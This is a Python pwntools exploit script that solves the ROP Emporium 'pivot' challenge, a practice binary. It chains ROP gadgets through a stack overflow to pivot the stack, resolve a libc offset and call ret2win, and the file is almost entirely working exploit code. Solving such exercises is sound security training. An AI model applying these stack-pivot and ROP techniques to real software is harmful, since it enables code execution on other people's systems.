from pwn import *

libc = ELF('./libpivot.so')

# Gadgets section
poprbp = 0x400900
poprax = 0x400b00
xchg = 0x400b02
mov = 0x400b05
add = 0x400b09
foothold_function_call = 0x400850
foothold_function_plt = 0x602048
call_rax = 0x40098e
ret = 0x4007c9

libc_foothold_function = libc.symbols['foothold_function']
libc_ret2win  = libc.symbols['ret2win']
offset = -libc_foothold_function + libc_ret2win

p = process('./pivot')
p.recvuntil(': ')
pivot = p.recv(1024)[:14]
pivot = int(pivot[2:], 16)

exploit = ''
exploit += p64(foothold_function_call)
exploit += p64(poprax)
exploit += p64(foothold_function_plt)
exploit += p64(mov)
exploit += p64(poprbp)
exploit += p64(offset)
exploit += p64(add)
exploit += p64(ret) # Two rets because I am running this on Ubuntu 18.04
exploit += p64(ret) # Will probably not be required on other machines # For more info see MOVAPS issue https://ropemporium.com/guide.html#Common%20pitfalls
exploit += p64(call_rax)
p.sendline(exploit)

#Stack smash
exploit = ''
exploit += 'A'*40
exploit += p64(poprax)
exploit += p64(pivot)
exploit += p64(xchg)
p.recvuntil('>')
p.sendline(exploit)

p.recvuntil('so')
print p.recvuntil('}')